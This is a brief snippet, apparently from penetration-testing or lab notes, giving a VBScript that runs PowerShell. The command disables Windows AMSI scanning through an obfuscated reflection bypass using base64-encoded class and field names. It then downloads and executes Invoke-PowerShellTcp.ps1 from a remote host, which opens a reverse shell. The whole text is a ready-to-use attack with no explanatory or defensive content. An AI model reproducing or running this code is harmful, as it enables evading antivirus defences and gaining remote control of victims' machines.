	- Simple script for PowerShell code execution
```VBScript
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell.exe [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')")
```